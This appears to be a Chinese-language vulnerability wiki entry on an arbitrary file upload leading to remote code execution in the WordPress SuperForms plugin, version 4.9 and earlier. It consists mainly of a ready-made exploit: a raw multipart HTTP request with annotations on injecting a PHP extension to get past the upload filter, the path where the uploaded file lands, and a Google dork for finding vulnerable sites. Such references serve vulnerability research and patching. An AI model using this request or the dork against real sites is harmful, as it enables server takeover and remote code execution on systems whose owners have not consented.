---
title: "WordPress SuperForms 4.9 任意文件上传到远程代码执行"
date: 2026-10-12 09:01:14
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "WordPress"
tags:
  - "WordPress"
  - "代码执行"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

SuperForms官方链接：https://renstillmann.github.io/super-forms/#/

参考链接：

- https://www.exploit-db.com/exploits/49490

## 漏洞影响

```
All (<= 4.9.X)
```

## Google Dork

```
inurl:"/wp-content/plugins/super-forms/"
```

## 漏洞复现

poc：

```
POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1
 <=== exploit end point
Host: localhost
User-Agent: UserAgent
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------423513681827540048931513055996
Content-Length: 7058
Origin: localhost
Connection: close
Referer: localhost
Cookie: 

-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="accept_file_types"

jpg|jpeg|png|gif|pdf|JPG|JPEG|PNG|GIF|PDF                        <=======
inject extension (|PHP4) to validate file to upload
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="max_file_size"

8000000
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="image_library"

0
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name="files[]";
filename="filename.(extension)"    <====   inject code extension (.php4)
for example
Content-Type: application/pdf

Evil codes to be uploaded

-----------------------------423513681827540048931513055996--

# Uploaded Malicious File can  be Found in :
/wp-content/uploads/superforms/2021/01/<id>/filename.php4
u can get <id> from server reply .
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/WordPress-SuperForms-4.9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md)
